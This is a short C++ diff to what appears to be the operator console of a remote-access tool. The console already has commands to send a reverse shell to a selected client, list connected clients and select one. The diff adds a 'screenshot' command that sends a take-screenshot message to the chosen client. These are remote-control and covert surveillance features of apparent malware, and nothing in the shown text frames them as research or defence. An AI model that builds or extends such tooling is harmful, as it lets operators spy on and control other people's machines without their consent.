@@ -50,11 +50,14 @@ void Entrypoint::Startup()
 	_commands["r"] = [this] { SendReverseShell(); };
 	_commands["reverse"] = [this] { SendReverseShell(); };
 
+	_commands["screenshot"] = [this] { SendTakeScreenshot(); };
+
 	_commands["l"] = [this] { ListClients(); };
 	_commands["list"] = [this] { ListClients(); };
 
 	_commands["s"] = [this] { SelectClient(); };
 	_commands["select"] = [this] { SelectClient(); };
+
 
 	Trace("> ");
 }
@@ -106,6 +109,16 @@ void Entrypoint::SendReverseShell()
 			MessageType::ReverseShellMessage,
 			_commandSpan);
 	}
+}
+
+void Entrypoint::SendTakeScreenshot()
+{
+	ValidateSelection();
+
+	_manager->Send(
+		*_client,
+		MessageType::TakeScreenshot,
+		_argsSpan);
 }
 
 void Entrypoint::ListClients() const
